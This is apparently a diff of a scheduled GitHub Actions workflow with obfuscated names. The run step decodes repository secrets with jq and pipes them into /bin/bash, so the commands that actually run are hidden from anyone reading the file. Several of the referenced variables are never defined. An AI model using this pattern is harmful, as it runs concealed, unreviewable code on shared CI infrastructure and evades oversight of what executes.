@@ -1,30 +1,19 @@
 name: nishishuozhezhong
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 5/6 * * *'
-
+    - cron: '47 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nishishuozhezhong
         env:
-          cf6961: ${{ secrets.cf6961 }}
+          na2: ${{ secrets.na2 }}
         run: |
-          echo $cf6961 | jq -r .ebf2424 | /bin/bash
-          echo $yx167 | jq -r .evxjk68 | /bin/bash
-          echo $ldtnv110 | jq -r .xnvf427 | /bin/bash
-          echo $autxc768 | jq -r .gj90 | /bin/bash
-          echo $ssrte7 | jq -r .a7 | /bin/bash
-          echo $hd3059 | jq -r .tyte5656 | /bin/bash
-          echo $xwgzo09922 | jq -r .gf8 | /bin/bash
-          echo $m80673 | jq -r .tkake241 | /bin/bash
-          echo $vr62 | jq -r .orq30375 | /bin/bash
-          echo $gqu1 | jq -r .bho2 | /bin/bash
-          echo $cpdx2256 | jq -r .wqegt22 | /bin/bash
-          echo $td47668 | jq -r .nsjw61692 | /bin/bash
-          echo $t2640 | jq -r .jrm98856 | /bin/bash
+          echo $na2 | jq -r .pn21 | /bin/bash
+          echo $wjkr4 | jq -r .p3 | /bin/bash
+          echo $dzpo82245 | jq -r .qeg248 | /bin/bash
 
